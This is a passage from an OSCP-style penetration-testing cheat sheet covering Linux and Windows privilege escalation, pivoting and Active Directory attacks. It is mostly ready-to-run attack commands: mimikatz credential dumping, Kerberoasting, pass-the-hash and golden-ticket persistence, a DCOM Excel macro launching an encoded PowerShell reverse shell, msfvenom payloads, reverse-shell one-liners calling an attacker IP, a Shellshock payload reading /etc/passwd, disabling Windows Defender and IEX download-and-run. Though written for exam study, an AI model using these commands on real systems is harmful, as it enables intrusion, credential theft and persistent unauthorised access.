	find / -user root -perm -4000 -exec ls -ldb {} \;ls -
	```	
3. Escaping restricted shell
	```
	ssh USER@IP -t "bash --noprofile"
	ssh username@IP -t “/bin/sh” or “/bin/bash”
	ssh username@IP -t “() { :; }; /bin/bash” (Shellshock)
	```
4. ID_RSA SSH login
	```
	chmod 666 key
	ssh -i key USER@IP
	```
5. Dirty cow (fix to work)
	```
	PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
	```
6. 

	
## Post Exploitation

### New Host Discover
	```
	netdiscover
	ip a
	ip neigh
	hosts
	```

### Port Forwarding
Do not forget to to check /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
	```
	cat /root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
	/root/port_forwarding_and_tunneling/ssh_renote_port_forwarding.sh
	```
1. **RINETD**
Internet traffic on port 80 redirection from Kali to Victim
	```
	vim /etc/rinetd.conf
	0.0.0.0 80 IP 80
	sudo service rinetd restart
	\# Check kali listenening
	ss -antp | grep "80"
	\# Test
	nc -nvv KALI-IP 80
	```

2. **SSH Tunneling**
	```
	ssh -N -L LIP:LPORT:RHOST:RPORT USER@GATEWAY
	/# Now we are able to connect to the the machine : for example, smbmap
	smbclient -L 127.0.0.1 -U Administrator
	```

3. **SSH Remote Port Forwarding**
	```
	\# Setup listener in Kali
	ssh -N -R KALI-IP:LPORT:127.0.0.1:RPORT KALI@KALI-IP
	\# Check kali listenening
	ss -antp | grep "LPORT"
	```
	
4. **SSH Dynamic Port Forwarding and ProxyChains usage**
	```
	ssh -N -D 127.0.0.1:LPORT USER@RHOST
	vim /etc/proxychains.conf
	socks4	127.0.0.1:LPORT
	sudo proxychains nmap --top-ports=20 -sT -Pn TARGETIP
	```
	
5. **PLINK.exe**
	```
	\# Check ports listenening
	netstat -anpb tcp 
	cmd.exe /c echo y | plink.exe s\=ssh -l kali -pw ilak -R KALI-IP:LPORT:127.0.0.1:RPORT KALI-IP
	\# In Kali
	sudo nmap -sS -sV 127.0.0.1 -p LPORT
	```

6. **NETSH**
	```
	netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=LHOST connectport=RPORT connectaddress=RHOST
	\# Avoid firewall
	netsh advfirewall firewall add rule name ="forward_port_rule" protocol=TCP dir=in localip=LHOST localport=LPORT action=allow
	\# In kali
	smbclient -L RHOST --port=LPORT --user=Administrator
	sudo mount -t cifs -o port=LPORT //RHOST/Data -o username=Administrator,password=password /mnt/win10_share
	ls -l /mnt/win10_share/
	```

7. **HTTPTunnel-ing Through Deep Packet Inspection**
	```
	apt-cache search httptunnel
	sudo apt install httptunnel
	ssh -L 0.0.0.0:LPORT:RHOST:RPORT USER@127.0.0.1
	\# After ssh, confirm 
	ss -antp | grep "8888"
	\# On kali
	htc --forward-port LPORT RHOST:RPORT
	\# Confirm
	ps aux | grep htc
	ss- antp | grep "8080"
	```

8. SSHuttle
	```
	sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
	```
9. Interesting links
	```
	https://artkond.com/2017/03/23/pivoting-guide/
	```

### Active Directory

**Enumeration**

1. Leveraging net.exe
	```
	\# Enumerate local accounts
	net user
	net user /domain
	net user user /domain
	net group /domain
	```
	
2. Lightweight Directory Access Protocol (LDAP)
	```
	LDAP://HostName[:PortNumber][/DistinbuisedName]
	[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$SearchString
	
	LDAP://DC01.corp.com/DC=corp,DC=com
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry($SearchString,
	"corp.com\offsec", "lab")
	$Searcher.SearchRoot = $objDomain
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="samAccountType=805306368"
	$Searcher.FindAll()
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="samAccountType=805306368"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		Foreach($prop in $obj.Properties)
		{
			$prop
		}
		Write-Host "------------------------"
	}
	
	$Searcher.filter="name=Jeff_Admin"
	
	\# Resolving nested groups
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(objectClass=Group)"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		$obj.Properties.name
	}
	
	\# Dislaying Member Attribute
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(name=Secret_Group)"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		$obj.Properties.membe
	}
	
	\# Enumerating Nested Groups with Above Commands
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(name=Nested_Group)
	OR
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="(name=Another_Nested_Group)"
	```

4. Currently Logged on Users
	```
	Import-Module .\PowerView.ps1
	Get-NetLoggedon -ComputerName client251
	Get-NetSession -ComputerName dc01
	```

5. Enumeration Through Service Principal Names
	```
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
	$Searcher.SearchRoot = $objDomain
	$Searcher.filter="serviceprincipalname=*http*"
	$Result = $Searcher.FindAll()
	Foreach($obj in $Result)
	{
		Foreach($prop in $obj.Properties)
		{
			$prop
		}
	}
	
	nslookup CorpWebServer.corp.com \# service principalname
	```

**Active Directory Authentication**

1. NTLM Authentication
	```
	python Responder.py -l tun0 -rdw \# Capture the hash
	hashcat -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt
	```
2. SMB Relay
	```
	Edit reponder.conf -> SMB = Off, Http = Off
	python nmtlmrelayx.py -tf targets.txt -smb2support
	nmap --script=smb2-security-mode.nse -p445 ip.0/24
	mtlmrelayx.py -tf targets.txt -smb2support
	Point to attacker machine
	Connected to machine, forwarded to target, cracked
	nc ip 11000
	We are in SMB
	shares -> sharing files
	use C$ -> go to full control of whole computer
	```
3. Cached Credential Storage and Retrieval
	```
	mimikatz.exe
	privilege::debug
	sekurlsa::logonpasswords
	\# Get NTLM and SHA1 -> hashcat on them
	sekurlsa::tickets
	\# Look at Ticket Granting Service
	```
4. Service Account Attacks
	```
	Add-Type -AssemblyName System.IdentityModel
	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
	'HTTP/CorpWebServer.corp.com'
	klist
	kerberos::list /export \# Gets service ticket -> transfer to kali
	\# On kali
	sudo apt update && sudo apt install kerberoast
	python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
	```
5. Low and Slow Password Guessing
	```
	net accounts
	
	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
	$PDC = ($domainObj.PdcRoleOwner).Name
	$SearchString = "LDAP://"
	$SearchString += $PDC + "/"
	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
	$SearchString += $DistinguishedName
	New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
	\# If successful 
	distinguishedName : {DC=corp,DC=com}
	Path : LDAP://DC01.corp.com/DC=corp,DC=com
	\# Otherwise : The user name or password is incorrect
	
	.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
	```

**Actice Directory Lateral Movement**

1. Pass the hash
	```
	\# On kali
	pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
	```
2. Overpass the hash
	```
	mimikatz.exe
	sekurlsa::logonpasswords
	sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
	klist \# Kerberos tickets
	net use \\dc01
	klist
	\# look at the client and server
	.\PsExec.exe \\dc01 cmd.exe
	ipconfig
	whoami
	```
3. Pass the Ticket
	```
	whoami /user
	mimikatz.exe
	kerberos::purge
	kerberos::list
	kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
	kerberos::list
	```
4. Distributed Component Object Model
	```
	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
	$com | Get-Member TypeName: System.__ComObject#{000208d5-0000-0000-c000-000000000046}
	Sub mymacro()
		Shell ("notepad.exe")
	End Sub
	$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
	$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
	[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
	$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
	$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
	$temp = [system.io.directory]::createDirectory($Path)
	
	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
	$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
	$RemotePath = "\\192.168.1.110\c$\myexcel.xls" [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
	$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
	$temp = [system.io.directory]::createDirectory($Path)
	$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
	$com.Run("mymacro")
	
	\# On kali
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
	
	str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
	n = 50
	for i in range(0, len(str), n):
		print "Str = Str + " + '"' + str[i:i+n] + '"'
		
	Sub MyMacro()
		Dim Str As String
		Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
		Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
		...
		Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
		Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
		Shell (Str)
	End Sub
	
	```
	
**Active Direcotry Persistence**

1. Golden Tickets
	```
	psexec.exe \\dc01 cmd.exe
	mimikatz.exe
	privilege::debug
	lsadump::lsa /patch
	kerberos::purge
	kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
	misc::cmd
	psexec.exe \\dc01 cmd.exe
	ipconfig
	whoami
	whoami /groups
	psexec \\IP cmd.exe
	```
2. Domain Controller Synchronization
	```
	lsadump::dcsync /user:Administrator
	```

## Other tools
1. John ZIP
	```
	zip2john zip.zip > zip.hash
	john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
	unzip zip.zip
	password
	```
2. Hashcat ([modes](https://hashcat.net/wiki/doku.php?id=example_hashes)) 
	```
	hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -w 4
	hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -w 4 --show
	```
3. fcrackzip
	```
	fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
	```

**Also can use [CrackStation](https://crackstation.net/)**

3. Exploit Compilation
	```
	gcc -o exploit exploit.c
	gcc -m32 -o exploit exploit.c \# 32 bit
	i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe \# Windows
	gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c \# Cross Compilation
	```
4. Dictionary Generation
	```
	cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
	crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
	```
5. File transfer
	```
	\# Linux
	\# PYTHON
	python -m SimpleHTTPServer <PORT>
	python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
	\# FTP
	sudo python3 -m pyftpdlib  -p 21 -w
	\# SMB
	sudo smbserver.py -smb2support liodeus .
	\# WGET
	wget <URL> -o <OUT_FILE>
	\# CURL
	curl <URL> -o <OUT_FILE>
	\# NETCAT
	nc -lvp 1234 > <OUT_FILE> 
	nc <IP> 1234 < <IN_FILE> 
	\# SCP
	scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
	
	\# Windows
	\# FTP 
	echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
	ftp -v -n -s:ftp.txt
	\# SMB
	copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
	copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
	\# Powershell
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
	powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
	powershell "wget <URL>"
	\# Python
	python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
	\# CertUtil
	certutil.exe -urlcache -split -f "<URL>"
	\# NETCAT
	nc -lvp 1234 > <OUT_FILE> 
	nc <IP> 1234 < <IN_FILE>
	\# CURL
	curl <URL> -o <OUT_FILE>
	```
6. GIT
	```
	\# Donwload .git
	mkdir <DESTINATION_FOLDER>
	./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
	
	\# extract .git
	mkdir <EXTRACT_FOLDER>
	./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
	```
7. Hashes
	```
	\# Windows
	reg save HKLM\SAM c:\SAM
	reg save HKLM\System c:\System

	samdump2 System SAM > hashes

	
	\# Linux
	unshadow passwd shadow > hashes
	```
8. Mimikatz
	```
	privilege::debug

	sekurlsa::logonpasswords
	sekurlsa::tickets /export

	kerberos::list /export

	vault::cred
	vault::list

	lsadump::sam
	lsadump::secrets
	lsadump::cache
	```
9. Windows path without spaces
	```
	# path.cmd
	@echo off
	echo %~s1

	path.cmd "C:\Program Files (x86)\Common Files\test.txt"
	C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
	```
10. MsfVenom Payloads
	```
	\# Linux
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
	\# Windows
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
	\# PHP
	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
	\# Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
	\# ASP
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
	\# JSP
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
	\# WAR
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
	\# Python
	msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
	\# Bash
	msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
	\# Perl
	msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
	```
11. Listeners
	```
	use exploit/multi/handler
	set PAYLOAD <PAYLOAD>
	set LHOST <LHOST>
	set LPORT <LPORT>
	set ExitOnSession false
	exploit -j -z
	
	nc -nvlp PORT
	```

12. Reverse Shells [More Here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	```
	\# Nice tool
	# Download
	git clone https://github.com/ShutdownRepo/shellerator

	# Install requirements
	pip3 install --user -r requirements.txt

	# Executable from anywhere
	sudo cp shellrator.py /bin/shellrator
	
	\# Bash
	bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
	
	\# Perl
	perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	
	\# Python
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	
	\# Netcat
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
	
	\# Interactive Shells
	--> Python
	python -c 'import pty; pty.spawn("/bin/bash")'
	python3 -c 'import pty; pty.spawn("/bin/bash")'

	--> Bash
	echo os.system('/bin/bash')

	--> Sh
	/bin/bash -i

	--> Perl
	perl -e 'exec "/bin/bash"'

	--> Ruby
	exec "/bin/bash"

	--> Lua
	os.execute('/bin/bash')
	
	\# Adjusting for interactive shells
	stty size # Find your terminal size -> 50 235
	Ctrl-Z
	stty raw -echo  // Disable shell echo
	fg
	export SHELL=bash
	export TERM=xterm OR export TERM=xterm-256color
	stty rows 50 columns 235
	```
13. Shellshocks
	```
	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
	```

## Useful Linux Commands
### Find a file
	```
	locate <FILE>
	find / -name "<FILE>"
	```
### Active connection
	```
	netstat -lntp
	```
### List all SUID files
	```
	find / -perm -4000 2>/dev/null
	```
### Determine the current version of Linux
	```
	cat /etc/issue
	```
### Determine more information about the environment
	```
	uname -a
	```
### List processes running
	```
	ps -faux
	```
### List the allowed (and forbidden) commands for the invoking use
	```
	sudo -l
	```
	
## Useful Windows Commands
	```
	net config Workstation
	systeminfo
	net users

	ipconfig /all
	netstat -ano

	schtasks /query /fo LIST /v
	tasklist /SVC
	net start
	DRIVERQUERY

	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

	dir /s pass == cred == vnc == .config
	findstr /si password *.xml *.ini *.txt
	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s
	```
	
### Disable windows defender
	```
	sc stop WinDefend
	```
### Bypass restrictions
	```
	powershell -nop -ep bypass
	```
### List hidden files
	```
	dir /a
	```
### Find a file
	```
	dir /b/s "<FILE>"
	```
	
## Get Proofs for OSCP exam
### Linux
	```
	echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
	```

### Windows
	```
	echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
	```
